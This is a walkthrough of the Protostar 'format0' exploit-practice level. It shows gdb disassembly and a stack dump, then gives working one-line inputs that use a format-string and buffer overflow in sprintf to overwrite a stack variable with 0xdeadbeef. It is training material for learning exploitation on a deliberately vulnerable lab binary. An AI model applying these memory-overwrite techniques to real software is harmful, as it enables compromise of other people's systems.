# Format 0
## Overview
    This level introduces format strings, and how attacker supplied format strings
    can modify the execution flow of programs.
    Hints:
        This level should be done in less than 10 bytes of input.
        "Exploiting format string vulnerabilities"
## Process
    $ gdb -q ./format0
    Reading symbols from ./format0...done.
    (gdb) disas main
        Dump of assembler code for function main:
            0x0804842b <+0>:     push   %ebp
            0x0804842c <+1>:     mov    %esp,%ebp
            0x0804842e <+3>:     and    $0xfffffff0,%esp
            0x08048431 <+6>:     sub    $0x10,%esp
            0x08048434 <+9>:     mov    0xc(%ebp),%eax
            0x08048437 <+12>:    add    $0x4,%eax
            0x0804843a <+15>:    mov    (%eax),%eax
            0x0804843c <+17>:    mov    %eax,(%esp)
            0x0804843f <+20>:    call   0x80483f4 <vuln>
            0x08048444 <+25>:    leave
            0x08048445 <+26>:    ret
        End of assembler dump.
    (gdb) disas vuln
        Dump of assembler code for function vuln:
            0x080483f4 <+0>:     push   %ebp
            0x080483f5 <+1>:     mov    %esp,%ebp
            0x080483f7 <+3>:     sub    $0x68,%esp
            0x080483fa <+6>:     movl   $0x0,-0xc(%ebp)
            0x08048401 <+13>:    mov    0x8(%ebp),%eax
            0x08048404 <+16>:    mov    %eax,0x4(%esp)
            0x08048408 <+20>:    lea    -0x4c(%ebp),%eax
            0x0804840b <+23>:    mov    %eax,(%esp)
            0x0804840e <+26>:    call   0x8048300 <sprintf@plt>
            0x08048413 <+31>:    mov    -0xc(%ebp),%eax
            0x08048416 <+34>:    cmp    $0xdeadbeef,%eax
            0x0804841b <+39>:    jne    0x8048429 <vuln+53>
           0x0804841d <+41>:    movl   $0x8048510,(%esp)
           0x08048424 <+48>:    call   0x8048330 <puts@plt>
           0x08048429 <+53>:    leave
           0x0804842a <+54>:    ret
        End of assembler dump.
    (gdb) b *vuln+34
        Breakpoint 1 at 0x8048416: file format0/format0.c, line 15.
    (gdb) r AAAAAAAAAAAAAAAAAAAAAAA
        Starting program: /home/mickey/Desktop/protostar_exploit_practice/format0
        AAAAAAAAAAAAAAAAAAAAAAA
        Breakpoint 1, 0x08048416 in vuln (string=0xffffd7d4 'A'<repeats 23 times>)
        at format0/format0.c:15
        15      format0/format0.c: No such file or directory.
    (gdb) x/60x $esp
        0xffffd540: 0xffffd55c  0xffffd7d4  0x000000e0  0x00000000
        0xffffd550: 0xf7ffd000  0xf7ffd918  0xffffd570  0x41414141
        0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd570: 0x00414141  0x0000002f  0xf7e12dc8  0xf7fd5858
        0xffffd580: 0x00008000  0x08049624  0xffffd598  0x080482ec
        0xffffd590: 0x00000002  0x08049624  0xffffd5c8  0x00000000
        0xffffd5a0: 0xf7fb8000  0xf7fb8000  0xffffd5c8  0x08048444
        0xffffd5b0: 0xffffd7d4  0x080481e8  0x0804846b  0x00000000
        0xffffd5c0: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
        0xffffd5d0: 0x00000002  0xffffd664  0xffffd670  0x00000000
        0xffffd5e0: 0x00000000  0x00000000  0xf7fb8000  0xf7ffdc04
        0xffffd5f0: 0xf7ffd000  0x00000000  0xf7fb8000  0xf7fb8000
        0xffffd600: 0x00000000  0x03d3c2b4  0x3fb38ca4  0x00000000
        0xffffd610: 0x00000000  0x00000000  0x00000002  0x08048340
        0xffffd620: 0x00000000  0xf7fedf10  0xf7fe8780  0xf7ffd000
## Method
    You can see the result above that the buffer starts at the last stack of line
    0xffffd550 to third stack of line 0xffffd590 (since the variable "target" is 
    set to 0, and which is located just behind the end of the buffer, that is
    the last stack of line 0xffffd590).
    Thus, we need to first use 64 bytes to overwrite the space of buffer, and then
    uses "\xef\xbe\xad\xde" (little endian of 0xdeadbeef) to overwrite target.
## Answer
    $ ./format0 `python -c 'print "A"*64+"\xef\xbe\xad\xde"'`
    you have hit the target correctly :)
    or 
    $ ./format0 `python -c 'print "%64d"+"\xef\xbe\xad\xde"'`
    you have hit the target correctly :)
    
    Note: The 2nd answer is better, since the length of the input is limited 
          to less than or equal to 10 bytes.
